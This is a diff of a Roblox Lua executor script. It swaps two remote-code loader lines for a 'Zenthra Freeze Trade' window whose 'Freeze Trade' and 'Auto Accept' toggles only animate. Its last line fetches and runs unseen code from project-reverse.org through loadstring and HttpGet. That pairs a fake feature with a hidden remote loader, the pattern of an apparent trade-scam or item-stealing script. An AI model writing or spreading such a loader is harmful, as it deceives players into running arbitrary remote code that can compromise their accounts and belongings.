@@ -1,2 +1,125 @@
-loadstring(game:HttpGet('https://pastebin.com/raw/mNzHtMHP'))()
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNlNDMxN2UyLWU5ODAtNGRmZS1iZGJlLWY1YWZiYjMwMTRkMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJzYWJzcGF3bmJyYWlucm90In19"))()
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ResetOnSpawn = false
+
+-- FRAME
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 370, 0, 280)
+Frame.Position = UDim2.new(0.5, -185, 0.5, -140)
+Frame.BackgroundColor3 = Color3.fromRGB(8, 12, 35)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Selectable = true
+
+local corner = Instance.new("UICorner", Frame)
+corner.CornerRadius = UDim.new(0, 25)
+
+-- 🔥 DRAG ARREGLADO (este sí funciona en executor)
+Frame.Draggable = true
+
+-- TITLE
+local Title = Instance.new("TextLabel", Frame)
+Title.Text = "Zenthra Freeze Trade"
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(0,255,180)
+Title.TextScaled = true
+
+-- STATUS
+local Status = Instance.new("TextLabel", Frame)
+Status.Text = "SYSTEM READY"
+Status.Size = UDim2.new(1, 0, 0, 25)
+Status.Position = UDim2.new(0, 0, 0, 45)
+Status.BackgroundTransparency = 1
+Status.TextColor3 = Color3.fromRGB(0,255,180)
+
+-- ✨ PARTÍCULAS VISIBLES
+for i = 1, 20 do
+	local dot = Instance.new("Frame", Frame)
+	dot.Size = UDim2.new(0, 3, 0, 3)
+	dot.BackgroundColor3 = Color3.fromRGB(0,255,180)
+	dot.BorderSizePixel = 0
+	
+	local c = Instance.new("UICorner", dot)
+	c.CornerRadius = UDim.new(1,0)
+
+	dot.Position = UDim2.new(math.random(),0,math.random(),0)
+
+	task.spawn(function()
+		while true do
+			local newX = math.random()
+			local newY = math.random()
+			
+			TweenService:Create(dot, TweenInfo.new(2 + math.random(), Enum.EasingStyle.Linear), {
+				Position = UDim2.new(newX, 0, newY, 0),
+				Transparency = math.random()
+			}):Play()
+			
+			task.wait(2)
+		end
+	end)
+end
+
+-- TOGGLE (igual que antes)
+local function createToggle(text, yPos)
+	local holder = Instance.new("TextButton", Frame)
+	holder.Size = UDim2.new(0, 320, 0, 55)
+	holder.Position = UDim2.new(0, 25, 0, yPos)
+	holder.BackgroundColor3 = Color3.fromRGB(20, 30, 60)
+	holder.BorderSizePixel = 0
+	holder.Text = ""
+
+	local hc = Instance.new("UICorner", holder)
+	hc.CornerRadius = UDim.new(0, 18)
+
+	local label = Instance.new("TextLabel", holder)
+	label.Text = text
+	label.Size = UDim2.new(0.6, 0, 1, 0)
+	label.Position = UDim2.new(0, 15, 0, 0)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.fromRGB(200,200,255)
+	label.TextXAlignment = Enum.TextXAlignment.Left
+
+	local toggle = Instance.new("Frame", holder)
+	toggle.Size = UDim2.new(0, 60, 0, 28)
+	toggle.Position = UDim2.new(1, -75, 0.5, -14)
+	toggle.BackgroundColor3 = Color3.fromRGB(50,50,50)
+	toggle.BorderSizePixel = 0
+	
+	local tc = Instance.new("UICorner", toggle)
+	tc.CornerRadius = UDim.new(1, 0)
+
+	local circle = Instance.new("Frame", toggle)
+	circle.Size = UDim2.new(0, 26, 0, 26)
+	circle.Position = UDim2.new(0, 1, 0, 1)
+	circle.BackgroundColor3 = Color3.fromRGB(255,255,255)
+	circle.BorderSizePixel = 0
+	
+	local cc = Instance.new("UICorner", circle)
+	cc.CornerRadius = UDim.new(1,0)
+
+	local state = false
+
+	holder.MouseButton1Click:Connect(function()
+		state = not state
+		
+		if state then
+			toggle.BackgroundColor3 = Color3.fromRGB(0,200,120)
+			TweenService:Create(circle, TweenInfo.new(0.2), {
+				Position = UDim2.new(1, -27, 0, 1)
+			}):Play()
+		else
+			toggle.BackgroundColor3 = Color3.fromRGB(50,50,50)
+			TweenService:Create(circle, TweenInfo.new(0.2), {
+				Position = UDim2.new(0, 1, 0, 1)
+			}):Play()
+		end
+	end)
+end
+
+createToggle("Freeze Trade", 90)
+createToggle("Auto Accept", 160)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNlNDMxN2UyLWU5ODAtNGRmZS1iZGJlLWY1YWZiYjMwMTRkMSIsImtpbmQiOiJsb2FkZXIifQ"))()
